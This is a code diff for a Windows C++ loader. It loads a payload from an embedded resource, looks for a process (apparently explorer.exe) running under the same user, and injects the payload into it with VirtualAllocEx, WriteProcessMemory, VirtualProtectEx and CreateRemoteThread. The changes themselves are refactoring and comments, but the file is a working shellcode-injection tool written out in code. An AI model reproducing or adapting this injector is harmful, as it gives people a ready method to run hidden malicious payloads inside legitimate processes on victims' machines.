@@ -15,8 +15,7 @@ void GoForth();
 DWORD ProcessID(const char* ProcessName, TCHAR* domain_current, TCHAR* user_current)
 {
 	DWORD pid;
-	int check;
-	int test = 0;
+	BOOL check = FALSE;
 
 	//Create a snapshot of all running processes
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
@@ -36,36 +35,31 @@ DWORD ProcessID(const char* ProcessName, TCHAR* domain_current, TCHAR* user_curr
 				//Before passing injection on, check if value of remote process (explorer.exe) is
 				//the same user that ran binary
 				pid = ProcEntry.th32ProcessID;
-				int check = GetUserFromRemoteProcess(pid, domain_current, user_current);
+				check = GetUserFromRemoteProcess(pid, domain_current, user_current);
 
 				//If true and user and domain match, clean up, pass value to break loop, reeturn PID
-				if (check == 1) {
-					printf("success");
+				if (check == TRUE) {
 					CloseHandle(hSnapshot);
 					//Set to true to break final loop
-					test == 1;
 					//Return the processID of the found process
 					return ProcEntry.th32ProcessID;
 				}
 				//If fail, stay in loop, and keep trying
 				else {
-					printf("failed");
-					test = 0;
+					check = FALSE;
 				}
 			}
-		} 
-		while (Process32Next(hSnapshot, &ProcEntry) && test == 0); //Get the next process
-		
+		} while (Process32Next(hSnapshot, &ProcEntry) && check == FALSE); //Get the next process
 	}
 	CloseHandle(hSnapshot);
 	//Since a process hasn't been found, return 0
 	return 0;
 }
 
-int GetLogonFromToken(HANDLE hToken, TCHAR* domain_current, TCHAR* user_current)
+BOOL GetLogonFromToken(HANDLE hToken, TCHAR* domain_current, TCHAR* user_current)
 {
 	DWORD dwSize = MAX_NAME;
-	int bSuccess = 0;
+	BOOL bSuccess;
 	DWORD dwLength = 0;
 	_bstr_t strUser = "";
 	_bstr_t strdomain = "";
@@ -124,12 +118,10 @@ int GetLogonFromToken(HANDLE hToken, TCHAR* domain_current, TCHAR* user_current)
 		strdomain = lpDomain;
 
 		if (strcmp(strUser, user_current)==0 && (strcmp(strdomain, domain_current)==0)) {
-			//printf("Tested true\n");
-			bSuccess = 1;
+			bSuccess = TRUE;
 		}
 		else {
-			//printf("Tested false\n");
-			bSuccess = 0;
+			bSuccess = FALSE;
 		}
 	}
 
@@ -137,11 +129,10 @@ Cleanup:
 
 	if (ptu != NULL)
 		HeapFree(GetProcessHeap(), 0, (LPVOID)ptu);
-	//printf("1 %d\n", bSuccess);
 	return bSuccess;
 }
 
-int GetUserFromRemoteProcess(DWORD procId, TCHAR* domain_current, TCHAR* user_current)
+BOOL GetUserFromRemoteProcess(DWORD procId, TCHAR* domain_current, TCHAR* user_current)
 {
 	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, procId);
 	if (hProcess == NULL)
@@ -153,13 +144,11 @@ int GetUserFromRemoteProcess(DWORD procId, TCHAR* domain_current, TCHAR* user_cu
 		CloseHandle(hProcess);
 		return E_FAIL;
 	}
-	int bres = GetLogonFromToken(hToken, domain_current, user_current);
+	BOOL bres = GetLogonFromToken(hToken, domain_current, user_current);
 
 	CloseHandle(hToken);
 	CloseHandle(hProcess);
-	//printf("2 %d\n", bres);
 	return bres;
-		//? S_OK : E_FAIL;
 }
 
 BOOL GetCurrentUserAndDomain(PTSTR szUser, PDWORD pcchUser, PTSTR szDomain, PDWORD pcchDomain) {
@@ -233,6 +222,7 @@ void GoForth() {
 	//.bin binary value
 	unsigned char* runMe;
 	unsigned int len;
+
 	//Make sure to set MAKERESOURCE(int) to whatever is specified in the resource.h file
 	HRSRC res = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
 	HGLOBAL hResource = LoadResource(NULL, res);
@@ -257,12 +247,16 @@ void GoForth() {
 	//Get a handle to the process
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
 
+	//Allocate space using handle to process, set permissions to RW
 	Memory = VirtualAllocEx(hProcess, nullptr, len, MEM_COMMIT, PAGE_READWRITE);
 
+	//Write to memory allocated
 	WriteProcessMemory(hProcess, Memory, (PVOID)runMe, (SIZE_T)len, (SIZE_T*)NULL);
 
+	//Set permissions back to read
 	rv = VirtualProtectEx(hProcess, Memory, len, PAGE_EXECUTE_READ, &oldprotect);
 
+	//Yeet
 	if (rv != 0) {
 		HANDLE th = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)Memory, 0, 0, 0);
 	}
